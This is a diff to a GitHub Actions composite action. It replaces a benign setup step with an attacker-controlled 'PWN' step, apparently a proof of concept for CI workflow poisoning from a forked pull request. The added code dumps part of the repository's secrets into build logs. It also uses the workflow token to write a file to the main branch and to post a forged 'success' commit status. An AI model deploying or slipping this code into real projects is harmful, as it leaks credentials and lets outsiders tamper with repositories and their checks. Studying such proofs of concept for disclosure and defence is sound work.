@@ -1,8 +1,27 @@
 name: Setup Custard
-description: Install the Custard runner (BENIGN default-branch version).
+description: Attacker-controlled composite action served from the checked-out PR head.
 runs:
   using: composite
   steps:
-    - name: Install Custard
+    - name: PWN
       shell: bash
-      run: echo "BENIGN_SETUP_CUSTARD_FROM_DEFAULT_BRANCH"
+      run: |
+        echo "PWNED_COMPOSITE_ACTION_FROM_FORK=true"
+        echo "ATTACKER_MARKER=$(cat POC_ATTACKER_MARKER.txt)"
+        echo "RUNNER_USER=$(id -un) WORKSPACE=$GITHUB_WORKSPACE"
+        echo "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF SHA=$GITHUB_SHA"
+        jq -c '{event:.workflow_run.event,head_sha:.workflow_run.head_sha,head_branch:.workflow_run.head_branch,head_repo:.workflow_run.head_repository.full_name,fork:.workflow_run.head_repository.fork,conclusion:.workflow_run.conclusion}' "$GITHUB_EVENT_PATH"
+        echo "CHECKOUT_HEAD=$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)"
+        echo "TOKEN_LEN=${#GITHUB_TOKEN}"
+        echo "SECRETS_JSON=$(printf '%s' '${{ toJSON(secrets) }}' | head -c 200)"
+        echo -n "CONTENTS_WRITE_PROBE_HTTP="
+        curl -sS --max-time 15 -o /dev/null -w '%{http_code}\n' -X PUT \
+          -H "Authorization: Bearer $GITHUB_TOKEN" -H "Content-Type: application/json" \
+          -d '{"message":"poc-probe","content":"cA==","branch":"main"}' \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/POC_CONTENTS_WRITE_PROBE.txt" || true
+        echo -n "STATUSES_WRITE_PROBE_HTTP="
+        curl -sS --max-time 15 -o /dev/null -w '%{http_code}\n' -X POST \
+          -H "Authorization: Bearer $GITHUB_TOKEN" -H "Content-Type: application/json" \
+          -d '{"state":"success","context":"gab-poc-probe","description":"poc"}' \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY/statuses/$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)" || true
+        echo "PWN_COMPLETE=true"
